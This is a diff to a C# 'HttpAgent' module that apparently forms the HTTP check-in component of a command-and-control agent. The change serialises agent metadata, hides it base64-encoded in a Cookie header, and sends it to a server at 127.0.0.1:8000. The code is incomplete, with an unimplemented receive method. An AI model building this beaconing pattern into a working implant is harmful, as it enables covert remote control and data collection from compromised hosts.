@@ -1,6 +1,8 @@
-﻿using AgentCore.Controllers;
+﻿using AgentCore;
+using AgentCore.Controllers;
 using AgentCore.Interfaces;
 using AgentCore.Models;
+using AgentCore.Modules;
 using System;
 using System.Collections.Generic;
 using System.Linq;
@@ -15,11 +17,15 @@ namespace HttpAgent.Modules
     {
         private ConfigController Config { get; set; }
         public ModuleStatus ModuleStatus { get; set; }
+        private WebClient WebClient { get; set; } = new WebClient();
 
         public void Init(ConfigController config)
         {
             ModuleStatus = ModuleStatus.Starting;
             Config = config;
+
+            WebClient.DownloadDataCompleted += DownloadDataCallback;
+            WebClient.Headers.Clear();
         }
 
         public bool RecvData()
@@ -27,7 +33,7 @@ namespace HttpAgent.Modules
             throw new NotImplementedException();
         }
 
-        public void Run()
+        public void Start()
         {
             ModuleStatus = ModuleStatus.Running;
 
@@ -59,11 +65,16 @@ namespace HttpAgent.Modules
 
         private void AgentCheckIn()
         {
-            var client = new WebClient
-            {
-                BaseAddress = string.Format("http://{0}:{1}", (string)Config.GetOption(ConfigSetting.ConnectHost), Config.GetOption(ConfigSetting.ConnectPort))
-            };
-            client.DownloadString("/testuri");
+            var metadata = Helpers.SerialiseData<Metadata>(Config.GetOption(ConfigSetting.Metadata) as Metadata);
+            WebClient.Headers.Add("Cookie", Convert.ToBase64String(metadata));
+
+            WebClient.DownloadDataAsync(new Uri("http://127.0.0.1:8000/test"));
+        }
+
+        private void DownloadDataCallback(object sender, DownloadDataCompletedEventArgs e)
+        {
+            var response = e.Result;
+            Console.WriteLine(Encoding.UTF8.GetString(response));
         }
     }
 }
